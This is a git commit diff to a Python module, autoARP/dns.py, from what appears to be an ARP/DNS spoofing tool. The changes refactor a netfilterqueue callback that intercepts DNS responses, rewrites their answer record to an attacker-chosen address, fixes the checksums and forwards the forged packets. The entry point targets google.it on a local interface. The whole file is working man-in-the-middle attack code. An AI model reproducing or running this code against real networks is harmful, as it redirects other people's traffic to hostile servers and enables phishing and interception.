ad58d77a24a11c66f3730d5b7e2cb1193d2476e8
lorenzobadas <lorenzo.badas@gmail.com>
2023-06-02 19:05:12 +0200

    Some changes

--- autoARP/dns.py
+++ autoARP/dns.py
@@ -41,29 +41,27 @@ import netfilterqueue
         else:
             print("Not important")'''
 
-redirected_webserver = "131.155.194.237"
-victim_webserver = None
-
-def dns_response(pkt):#, interface, redirected_webserver, victim_webserver = None):
-    packet = scapy.IP(pkt.get_payload())
-    print("Got packet")
-    if packet.haslayer(scapy.DNSRR):
+def dns_response(pkt, interface, redirected_webserver, victim_webserver = None):
+    packet = IP(pkt.get_payload())
+    print("Got packet", hex(packet[DNS].id))
+    print(packet.show())
+    if packet.haslayer(DNSRR):
         print("Got DNS response packet")
-        qname = packet[scapy.DNSQR].qname
+        qname = packet[DNSQR].qname
 
         if victim_webserver in qname.decode() or victim_webserver is None:
-            packet[scapy.DNSRR].rdata = redirected_webserver
+            packet[DNSRR].rdata = redirected_webserver
             
-            del packet[scapy.IP].len
-            del packet[scapy.IP].chksum
-            del packet[scapy.UDP].len
-            del packet[scapy.UDP].chksum
+            del packet[IP].len
+            del packet[IP].chksum
+            del packet[UDP].len
+            del packet[UDP].chksum
 
             pkt.set_payload(bytes(packet))
             print("DNS packet was modified")
     
     pkt.accept()
-    print("Packet forwarded")
+    print("Packet forwarded\n")
 
 def dns_attack(interface, redirected_webserver, victim_webserver = None):
     #bpf_filter = 'udp and port 53'
@@ -72,7 +70,7 @@ def dns_attack(interface, redirected_webserver, victim_webserver = None):
     queue = netfilterqueue.NetfilterQueue()
 
     # Bind the queue to the nfqueue subsystem, specify the callback function
-    queue.bind(0, dns_response)
+    queue.bind(0, lambda pkt: dns_response(pkt, interface, redirected_webserver, victim_webserver))
 
     try:
         # Run the queue
@@ -87,4 +85,4 @@ def dns_attack(interface, redirected_webserver, victim_webserver = None):
 
 
 if __name__ == '__main__':
-    dns_attack("wlp0s20f3", "131.155.194.237")
+    dns_attack("wlp0s20f3", "10.20.30.4", "google.it")
